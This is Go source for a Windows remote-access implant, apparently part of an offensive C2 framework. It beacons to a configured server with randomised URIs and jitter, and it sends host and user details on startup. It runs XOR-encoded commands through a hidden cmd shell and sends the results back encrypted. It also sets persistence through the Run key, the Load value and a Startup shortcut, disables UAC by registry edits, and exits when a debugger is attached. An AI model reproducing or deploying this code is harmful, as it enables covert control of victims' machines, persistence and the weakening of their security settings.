package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	cRand "crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	_ "embed"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"math/big"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/crypto/pbkdf2"
	win "golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"

	"github.com/elastic/go-windows"
	ole "github.com/go-ole/go-ole"
	oleutil "github.com/go-ole/go-ole/oleutil"
	"github.com/google/uuid"
)

//go:embed config.implant
var configFile []byte

type Config struct {
	IP_ADDRESS string
	PORT       string
	ARCH       string
	DEBUG      string
	NAME       string
	REGNAME    string
	KEY        string
}

var pubKey *rsa.PublicKey

var letterRunes = []rune("abcdefghijklmnopqrstuvwxyz")
var registryName string
var serverKey string

func loadPubKey() {
	decoded, _ := hex.DecodeString(serverKey)
	pemDecoded, _ := pem.Decode(decoded)
	pubKey, _ = x509.ParsePKCS1PublicKey(pemDecoded.Bytes)
}

func xorEncrypt(encoded string) (output string) {
	key := "Nami"
	encodedOutput, _ := base64.StdEncoding.DecodeString(encoded)
	for i := 0; i < len(encodedOutput); i++ {
		output += string(encodedOutput[i] ^ key[i%len(key)])
	}
	return output
}

func generatePassword() string {
	const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
	ret := make([]byte, 20)
	for i := 0; i < 20; i++ {
		num, _ := cRand.Int(cRand.Reader, big.NewInt(int64(len(letters))))
		ret[i] = letters[num.Int64()]
	}
	return string(ret)
}

func deriveKey(passphrase string) ([]byte, []byte) {
	salt := make([]byte, 12)
	rand.Read(salt)
	return pbkdf2.Key([]byte(passphrase), salt, 1000, 32, sha256.New), salt
}

func encryptAES(passphrase string, plaintext []byte) string {
	key, salt := deriveKey(passphrase)
	iv := make([]byte, 12)
	rand.Read(iv)
	b, _ := aes.NewCipher(key)
	aesgcm, _ := cipher.NewGCM(b)
	data := aesgcm.Seal(nil, iv, plaintext, nil)
	return hex.EncodeToString(salt) + hex.EncodeToString(iv) + hex.EncodeToString(data)
}

func encryptOAEP(secretMessage string, pubkey rsa.PublicKey) string {
	label := []byte("Nami")
	rng := cRand.Reader
	ciphertext, _ := rsa.EncryptOAEP(sha256.New(), rng, &pubkey, []byte(secretMessage), label)
	return base64.StdEncoding.EncodeToString(ciphertext)
}

func encryptPayload(contents string) (string, string) {
	aesPassword := generatePassword()
	encryptedContents := encryptAES(aesPassword, []byte(contents))
	encryptedKey := encryptOAEP(aesPassword, *pubKey)
	return encryptedKey, encryptedContents
}

func GetConfig() (string, string, string, string) {
	configuration := Config{}
	json.Unmarshal(configFile, &configuration)
	registryName = configuration.REGNAME
	serverKey = configuration.KEY
	return fmt.Sprintf("http://%s:%s", configuration.IP_ADDRESS, configuration.PORT), configuration.DEBUG, configuration.ARCH, configuration.NAME
}

func persistenceCreate(persistType string) string {
	currentExe, err := os.Executable()
	if err != nil {
		return "error"
	}
	if persistType == "persistence_run" {
		runKey, err := registry.OpenKey(registry.CURRENT_USER, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)
		if err != nil {
			return "error"
		}
		defer runKey.Close()

		err = runKey.SetStringValue(registryName, currentExe)
		if err != nil {
			return "error"
		}
	}
	if persistType == "persistence_load" {
		loadKey, err := registry.OpenKey(registry.CURRENT_USER, `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows`, registry.ALL_ACCESS)
		if err != nil {
			return "error"
		}
		defer loadKey.Close()

		err = loadKey.SetStringValue("Load", currentExe)
		if err != nil {
			return "error"
		}
	}
	if persistType == "persistence_startupfolder" {
		userDir, _ := os.UserHomeDir()
		ole.CoInitializeEx(0, ole.COINIT_APARTMENTTHREADED|ole.COINIT_SPEED_OVER_MEMORY)
		oleShellObject, _ := oleutil.CreateObject("WScript.Shell")
		defer oleShellObject.Release()

		wShell, _ := oleShellObject.QueryInterface(ole.IID_IDispatch)
		defer wShell.Release()

		createShortcut, _ := oleutil.CallMethod(wShell, "CreateShortcut", fmt.Sprintf("%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\%s.lnk", userDir, registryName))
		iDispatch := createShortcut.ToIDispatch()

		oleutil.PutProperty(iDispatch, "TargetPath", currentExe)
		oleutil.PutProperty(iDispatch, "IconLocation", "shell32.dll,242")
		oleutil.CallMethod(iDispatch, "Save")
	}
	return "success"
}

func uacCreate(uacType string) string {
	fmt.Println("errortest")
	adminStatus := win.GetCurrentProcessToken().IsElevated()
	if !adminStatus {
		return "noadmin"
	}
	if uacType == "uac_registry" {
		luaKey, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`, registry.ALL_ACCESS)
		if err != nil {
			return "error"
		}
		defer luaKey.Close()

		err = luaKey.SetDWordValue("EnableLUA", 0)
		if err != nil {
			return "error"
		}
		err = luaKey.SetDWordValue("ConsentPromptBehaviorAdmin", 0)
		if err != nil {
			return "error"
		}
		err = luaKey.SetDWordValue("PromptOnSecureDesktop", 0)
		if err != nil {
			return "error"
		}
	}
	return "success"
}

func antiDebug(arch string) {
	pid := os.Getpid()
	var access uint32
	var pbi windows.ProcessInfoClass
	var infoLen uint32

	if arch == "32" {
		infoLen = 4
	} else if arch == "64" {
		infoLen = 8
	}

	access = windows.PROCESS_VM_READ | syscall.PROCESS_QUERY_INFORMATION

	winProcessHandle, err := syscall.OpenProcess(access, false, uint32(pid))
	if err != nil {
		return
	}

	_, err = windows.NtQueryInformationProcess(winProcessHandle, windows.ProcessDebugPort, unsafe.Pointer(&pbi), infoLen)
	if err != nil {
		return
	}
	if pbi != 0 {
		os.Exit(0)
	} else {
		return
	}
}

func Beacon(uuid string, url string) string {
	uri := GenerateRandomString("c")
	client := httpClient()
	req, err := http.NewRequest("GET", fmt.Sprintf("%s/%s", url, uri), nil)
	if err != nil {
		return ""
	}

	req.Header.Set("Location", uuid)

	resp, err := client.Do(req)
	if err != nil {
		return ""
	}

	if resp.StatusCode == 401 {
		return resp.Header.Get("Origin-Isolation")
	}

	return ""
}

func GenerateRandomString(start string) string {
	rand.Seed(time.Now().UnixNano())
	stringsize := 5 + rand.Intn(25-5+1)

	s := make([]rune, stringsize)
	for i := range s {
		s[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return start + string(s)
}

func CommandExecute(encodedCommand string) string {
	command := xorEncrypt(encodedCommand)
	if command == "kill_session" {
		os.Exit(0)
	}
	if command == "persistence_run" {
		results := persistenceCreate(command)
		if results == "error" {
			return "error"
		} else {
			return "\t[+] Registry \"Run\" key created!"
		}
	}
	if command == "persistence_load" {
		results := persistenceCreate(command)
		if results == "error" {
			return "error"
		} else {
			return "\t[+] Windows Load key created!"
		}
	}
	if command == "persistence_startupfolder" {
		results := persistenceCreate(command)
		if results == "error" {
			return "error"
		} else {
			return "\t[+] Startup Folder LNK created!"
		}
	}
	if command == "uac_registry" {
		results := uacCreate(command)
		if results == "noadmin" {
			return "\t[-] UAC bypass unsuccessful due to not being an administrator!"
		}
		if results == "error" {
			return "error"
		} else {
			return "\t[+] UAC Bypass successfully configured!"
		}
	}
	cmd := exec.Command("cmd", "/c", command)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	stdout, err := cmd.Output()
	if err != nil {
		return ("Unknown Command!")
	}
	return strings.TrimSuffix(string(stdout), "\r\n")
}

func SendResults(results string, url string) {
	uri := GenerateRandomString("r")
	encryptedKey, encryptedMsg := encryptPayload(results)
	bodyReader := bytes.NewReader([]byte(encryptedMsg))
	client := httpClient()
	req, _ := http.NewRequest("POST", fmt.Sprintf("%s/%s", url, uri), bodyReader)
	req.Header.Set("Authorization", "Basic "+encryptedKey)
	client.Do(req)
}

func httpClient() *http.Client {
	var d = &net.Dialer{
		Timeout: 5 * time.Second,
	}

	var tr = &http.Transport{
		Dial:                d.Dial,
		TLSHandshakeTimeout: 5 * time.Second,
	}

	return &http.Client{
		Timeout:   10 * time.Second,
		Transport: tr,
	}
}

func updateCheckinTime() time.Time {
	t := time.Now()
	base := time.Duration(0) * time.Hour
	jitter := time.Duration(rand.Intn(11)) * time.Second

	return t.Add(base).Add(jitter)
}

func InitSession(uuid string, url string, name string) {
	uri := GenerateRandomString("f")
	fullInfo := gatherInfo(uuid, name)
	client := httpClient()
	req, _ := http.NewRequest("GET", fmt.Sprintf("%s/%s", url, uri), nil)
	req.Header.Set("Location", fullInfo)
	client.Do(req)
}

func gatherInfo(uuid string, name string) string {
	hostname := exec.Command("hostname")
	hostOut, err := hostname.Output()
	if err != nil {
		hostOut = []byte("UNKNOWN_HOST")
	}
	username := exec.Command("whoami")
	userOut, err := username.Output()
	if err != nil {
		userOut = []byte("UNKNOWN_USER")
	}
	hostTrim := strings.TrimSuffix(string(hostOut), "\r\n")
	userTrim := strings.TrimSuffix(string(userOut), "\r\n")
	finalString := base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf("%s||%s||%s||%s", name, uuid, hostTrim, userTrim)))
	return string(finalString)
}

func main() {
	configUrl, antiD, implantArch, implantName := GetConfig()
	if antiD == "true" {
		antiDebug(implantArch)
	}
	loadPubKey()
	id := (uuid.New()).String()
	InitSession(id, configUrl, implantName)

	checkIn := time.Now()

	for {
		if checkIn.Before(time.Now()) {
			beacon := Beacon(id, configUrl)
			if beacon != "" {
				results := CommandExecute(beacon)
				SendResults(results, configUrl)
			}
			checkIn = updateCheckinTime()
		}

		time.Sleep(1 * time.Second)
	}
}
